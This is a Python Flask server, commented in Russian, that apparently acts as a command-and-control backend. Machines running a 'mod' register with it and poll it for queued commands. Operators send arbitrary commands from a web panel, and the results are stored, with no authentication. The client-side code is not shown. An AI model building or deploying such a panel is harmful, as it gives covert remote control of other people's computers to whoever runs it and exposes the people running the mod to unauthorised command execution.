from flask import Flask, request, jsonify, render_template
import sqlite3
import json
from datetime import datetime
import uuid

app = Flask(__name__)

# Инициализация базы данных
def init_db():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    # Таблица компьютеров
    c.execute('''CREATE TABLE IF NOT EXISTS computers
                 (id TEXT PRIMARY KEY,
                  name TEXT,
                  last_seen TIMESTAMP,
                  status TEXT)''')
    # Таблица команд
    c.execute('''CREATE TABLE IF NOT EXISTS commands
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  computer_id TEXT,
                  command TEXT,
                  status TEXT,
                  result TEXT,
                  created_at TIMESTAMP)''')
    conn.commit()
    conn.close()

init_db()

# Главная страница - панель управления
@app.route('/')
def index():
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    computers = c.execute("SELECT id, name, last_seen, status FROM computers ORDER BY last_seen DESC").fetchall()
    conn.close()
    return render_template('index.html', computers=computers)

# Регистрация компьютера (мод вызывает при запуске)
@app.route('/api/register', methods=['POST'])
def register():
    data = request.json
    computer_id = str(uuid.uuid4())[:8]
    computer_name = data.get('name', 'Unknown')
    
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT INTO computers (id, name, last_seen, status) VALUES (?, ?, ?, ?)",
              (computer_id, computer_name, datetime.now(), 'online'))
    conn.commit()
    conn.close()
    
    return jsonify({"computer_id": computer_id})

# Получение команд (мод опрашивает)
@app.route('/api/poll/<computer_id>', methods=['GET'])
def poll(computer_id):
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    
    # Обновляем last_seen
    c.execute("UPDATE computers SET last_seen=?, status=? WHERE id=?",
              (datetime.now(), 'online', computer_id))
    
    # Ищем новую команду
    command = c.execute("SELECT id, command FROM commands WHERE computer_id=? AND status='pending' ORDER BY id LIMIT 1",
                        (computer_id,)).fetchone()
    
    if command:
        # Помечаем как отправленную
        c.execute("UPDATE commands SET status='sent' WHERE id=?", (command[0],))
        conn.commit()
        conn.close()
        return jsonify({"command": command[1]})
    
    conn.close()
    return jsonify({"command": None})

# Отправка результата выполнения
@app.route('/api/result/<computer_id>', methods=['POST'])
def result(computer_id):
    data = request.json
    command = data.get('command')
    result_data = data.get('result')
    
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("UPDATE commands SET status='done', result=? WHERE computer_id=? AND command=? AND status='sent'",
              (result_data, computer_id, command))
    conn.commit()
    conn.close()
    
    return jsonify({"status": "ok"})

# Отправка команды с веб-панели
@app.route('/api/send_command', methods=['POST'])
def send_command():
    computer_id = request.form['computer_id']
    command = request.form['command']
    
    conn = sqlite3.connect('database.db')
    c = conn.cursor()
    c.execute("INSERT INTO commands (computer_id, command, status, created_at) VALUES (?, ?, ?, ?)",
              (computer_id, command, 'pending', datetime.now()))
    conn.commit()
    conn.close()
    
    return jsonify({"status": "queued"})

if __name__ == '__main__':
    app.run(debug=True)
